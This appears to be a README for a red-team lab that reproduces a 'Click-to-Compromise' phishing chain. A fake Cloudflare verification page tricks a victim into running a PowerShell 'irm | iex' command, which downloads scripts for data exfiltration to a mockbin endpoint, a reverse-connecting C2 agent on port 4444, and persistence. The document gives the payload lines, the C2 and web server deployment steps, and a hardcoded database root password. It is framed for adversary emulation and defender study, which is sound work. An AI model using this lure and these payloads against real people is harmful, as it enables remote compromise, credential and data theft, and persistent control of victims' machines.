# Materials for Click-to-Compromise technique

[This article]() is a deep dive into the **Click-to-Compromise** technique: a minimal-interaction, post-phishing attack chain that transitions from a single PowerShell command into full system compromise. It’s designed for red teamers, malware analysts, adversary emulation professionals, and curious defenders looking to understand modern evasion techniques beyond script kiddie noise.

## The attack chain

<div align="center"> 
  <img src="/resources/attack_chain.png" alt="" />
</div>

## The files

- **C2 folder:** contains the source code I have used within an IDE (IntelliJ IDEA) to run the C2.
- **website folder:** contains the web files ready to host in a server.
- **payloads folder:** contains the *.ps1* files.

## The setup

I tried to keep the setup as simple as possible for replication purposes: just 2 machines running Windows 11.

### Attacker

I was investigating on Windows 11 OS and the only tools needed are:
- Docker
- VirtualBox
- IDE to run the C2 and modify the code as needed
- Cloudflare Tunnel (setup is out if the scope of this doc)

> **REMEBER: Modify the payloads as needed in all files.**

On Cloudflare Zero Trust, create a tunnel (if you don't have one already) and create a public hostname pointing to your website server local IP. This will be your malicious website that we will need to add in the next step. 

Inside `index.html`:

```javascript
var maliciousCommand = 'powershell -ExecutionPolicy Bypass -NoProfile -Command irm \'<https://your.serverurl.com/payload.html>\' | iex';
```

Inside `payload.html`:

```
Invoke-WebRequest -Uri https://your.serverurl.com/payloads/cloudflare.verification.txt -OutFile $env:USERPROFILE\Desktop\cloudflare.verification.ps1; 
powershell -ExecutionPolicy Bypass -File $env:USERPROFILE\Desktop\cloudflare.verification.ps1
```

Inside `cloudflare.verification.txt`:

```
Invoke-WebRequest -Uri https://your.serverurl.com/payloads/infoexfil.ps1 -OutFile $env:USERPROFILE\Desktop\infoexfil.ps1

Invoke-WebRequest -Uri https://your.serverurl.com/payloads/agent.ps1 -OutFile "$env:USERPROFILE\Desktop\agent.ps1"

Invoke-WebRequest -Uri https://your.serverurl.com/payloads/persist.ps1 -OutFile "$env:USERPROFILE\Desktop\persist.ps1"
```

Inside `infoexfil.ps1`:

```powershell
Invoke-WebRequest -Uri "https://yourmockbin.api.mockbin.io/" -Method POST -Body $body -ContentType "application/json"
```

Inside `agent.ps1`:

```powershell
$C2 = "YOUR IP ADDRESS"
$Port = 4444
```

Inside `persist.ps1`:

```powershell
Invoke-WebRequest -Uri "https://your.serverurl.com/payloads/agent.ps1" -OutFile $payloadPath
```

#### Database

I have used **Docker Desktop**. Run a **MySQL** container with the following **environmental variables**:

```
MYSQL_ROOT_PASSWORD=w0DSQGYPsvARiBVTiwKKH3otYZ4rxKGu
MYSQL_DATABASE=c2server
```

Start the container.

#### C2

Open your preferred IDE and open the C2 files as a project. Then:

1. Run **TestDBConnection** class first to make sure your DB connection is fine and to create the **agents** table
2. Build the artifacts to deploy with **Tomcat**
3. Deploy to **Tomcat** and visit **/server/agents** endpoint

#### Website

I have used NGINX running on Docker. Start the container in your desired port (not 8080, I used a random 6984) and launch a terminal inside the website folder. To copy the files inside the container, run the following commands:

```
docker ps
```
This will list your running containers, identify your server conatiner name. Next, create the `payloads` directory in your server:

```
mkdir /usr/share/nginx/html/payloads
```

Then, launch a terminal inside your website folder and copy the files into your server Docker container with this commands:

```
docker cp index.html clickfix:/usr/share/nginx/html/
docker cp payloads.html clickfix:/usr/share/nginx/html/

docker cp turnstyle.css clickfix:/usr/share/nginx/html/
docker cp turnstile_gif.gif clickfix:/usr/share/nginx/html/
docker cp recaptcha.png clickfix:/usr/share/nginx/html/
```

Now, launch a terminal inside your payloads folder and copy the files into your server Docker container with this commands::

```
docker cp cloudflare.verification.ps1 clickfix:/usr/share/nginx/html/payloads/
docker cp infoexfil.ps1 clickfix:/usr/share/nginx/html/payloads/
docker cp persist.ps1 clickfix:/usr/share/nginx/html/payloads/
docker cp persist.ps1 clickfix:/usr/share/nginx/html/payloads/
``` 

### Victim

For the victim, I used a VirtualBox VM running **Windows 11 (24H2)** in bridged adapter mode. Then I just installed Chrome to access the website.

#### VM config

<div align="left"> 
  <img src="/resources/win_11_setup.png" width="500" alt="" />
</div>

## The attack

Once everything is running and tested, let's infect the victim machine. To do so, inside your victim VM just visit your malicious website and follow the prompt as an innocent victim would. If you did everything right, you should see how the files get downloaded in the Desktop and, after a minute or so, how the agent appears in your C2 agents panel at **/server/agents**.


